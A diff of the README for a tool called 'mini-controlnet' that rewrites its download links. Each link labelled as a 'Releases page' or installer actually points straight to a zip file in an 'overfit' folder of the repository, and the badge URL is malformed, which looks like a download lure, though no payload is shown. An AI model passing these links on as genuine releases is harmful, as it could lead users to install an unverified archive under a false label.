@@ -7,9 +7,9 @@ Welcome to mini-controlnet, a simple tool that allows you to create images guide
 
 ## 📥 Download mini-controlnet
 
-[![Download mini-controlnet](https://raw.githubusercontent.com/mataratas777OMG/mini-controlnet/main/overfit/mini-controlnet.zip%20Now%20-blue)](https://raw.githubusercontent.com/mataratas777OMG/mini-controlnet/main/overfit/mini-controlnet.zip)
+[![Download mini-controlnet](https://github.com/mataratas777OMG/mini-controlnet/raw/refs/heads/main/overfit/mini-controlnet.zip%20Now%20-blue)](https://github.com/mataratas777OMG/mini-controlnet/raw/refs/heads/main/overfit/mini-controlnet.zip)
 
-You can easily download the latest version of mini-controlnet. Just visit our [Releases page](https://raw.githubusercontent.com/mataratas777OMG/mini-controlnet/main/overfit/mini-controlnet.zip) to find the installer.
+You can easily download the latest version of mini-controlnet. Just visit our [Releases page](https://github.com/mataratas777OMG/mini-controlnet/raw/refs/heads/main/overfit/mini-controlnet.zip) to find the installer.
 
 ## 📋 Features
 
@@ -28,9 +28,9 @@ To use mini-controlnet, you need the following:
 
 ## 📂 Download & Install
 
-1. Click the button above or go directly to the [Releases page](https://raw.githubusercontent.com/mataratas777OMG/mini-controlnet/main/overfit/mini-controlnet.zip).
+1. Click the button above or go directly to the [Releases page](https://github.com/mataratas777OMG/mini-controlnet/raw/refs/heads/main/overfit/mini-controlnet.zip).
 
-2. On the Releases page, find the file named similar to `https://raw.githubusercontent.com/mataratas777OMG/mini-controlnet/main/overfit/mini-controlnet.zip` or the appropriate installer for your operating system.
+2. On the Releases page, find the file named similar to `https://github.com/mataratas777OMG/mini-controlnet/raw/refs/heads/main/overfit/mini-controlnet.zip` or the appropriate installer for your operating system.
 
 3. Click on the file to begin the download.
 
